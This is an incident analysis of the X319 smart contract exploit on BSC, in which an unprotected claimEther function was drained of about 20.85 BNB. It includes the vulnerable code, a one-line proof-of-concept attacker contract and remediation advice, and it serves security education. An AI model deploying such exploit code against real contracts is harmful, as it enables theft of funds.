# X319 — Unprotected claimEther Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-11-10 |
| **Protocol** | X319 (unidentified protocol) |
| **Chain** | BSC |
| **Loss** | ~12,900 USD |
| **Attacker** | [0xe60329a8](https://bscscan.com/address/0xe60329a82c5add1898ba273fc53835ac7e6fd5ca) |
| **Attack Tx** | [0x679028cb](https://app.blocksec.com/explorer/tx/bsc/0x679028cb0a5af35f57cbea120ec668a5caf72d74fcc6972adc7c75ef6c9a9092) |
| **Vulnerable Contract** | [0xedd632ea](https://bscscan.com/address/0xedd632eaf3b57e100ae9142e8ed1641e5fd6b2c0) |
| **Root Cause** | No access control on `claimEther(receiver, amount)` — anyone can transfer the contract's ETH to an arbitrary recipient |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-11/X319_exp.sol) |

---
## 1. Vulnerability Overview

The X319 contract (0xedd632) exposed a `claimEther(address receiver, uint256 amount)` function externally. This function transfers ETH (BNB) held by the contract to the specified recipient address, but contained no caller validation whatsoever. The attacker immediately invoked this function from a constructor to steal 20.85 BNB.

## 2. Vulnerable Code Analysis

```solidity
// ❌ X319 contract: ETH withdrawal function with no access control
contract X319 {
    // ❌ No onlyOwner — anyone can transfer any amount to any address
    function claimEther(address receiver, uint256 amount) external {
        payable(receiver).transfer(amount);
    }
}

// ✅ Fix:
// function claimEther(address receiver, uint256 amount) external onlyOwner {
//     require(amount <= address(this).balance, "insufficient balance");
//     payable(receiver).transfer(amount);
// }
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: X319_decompiled.sol
contract X319 {
    function claimEther(address p0, uint256 p1) external {}  // ❌ vulnerability
```

## 3. Attack Flow

```
Attacker (0xe60329a8)
  │
  ├─[1]─▶ Deploy AttackerC contract
  │         └─ Attack executes immediately in constructor
  │
  ├─[2]─▶ (constructor) IAddr1(addr1).claimEther(tx.origin, 2085 * 10**16)
  │         └─ ❌ No access control → transfers 20.85 BNB to attacker EOA
  │
  └─[3]─▶ ~12,900 USD worth of BNB stolen
```

## 4. PoC Code

```solidity
interface IAddr1 {
    function claimEther(address receiver, uint256 amount) external;
}

// Attack in a single line — executed from constructor
contract AttackerC {
    constructor() {
        // ❌ Direct call to unprotected claimEther
        IAddr1(addr1).claimEther(tx.origin, 2085 * 10**16);
        // Immediately transfers 20.85 BNB to attacker address
    }
}
```

## 5. Vulnerability Classification

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Vector** | Direct call to unprotected ETH withdrawal function |
| **CWE** | CWE-284: Improper Access Control |
| **DASP** | Access Control Vulnerability |
| **Severity** | Critical |

## 6. Remediation Recommendations

1. **Apply onlyOwner**: ETH/BNB withdrawal functions must always enforce access control
2. **Audit withdrawal function naming**: Comprehensively audit all functions matching withdrawal patterns such as `claimEther`, `rescueEth`, `withdraw`
3. **Amount cap**: Impose a maximum amount limit on single withdrawals
4. **Multi-signature**: Require multi-signature approval for large withdrawals

## 7. Lessons Learned

- The `claimEther(receiver, amount)` pattern, deployed without access control, allows immediate full drainage of funds.
- The attacker executed the exploit from a constructor, abusing the vulnerability in a single transaction.
- All withdrawal functions in contracts holding ETH/BNB must have access control verified before deployment.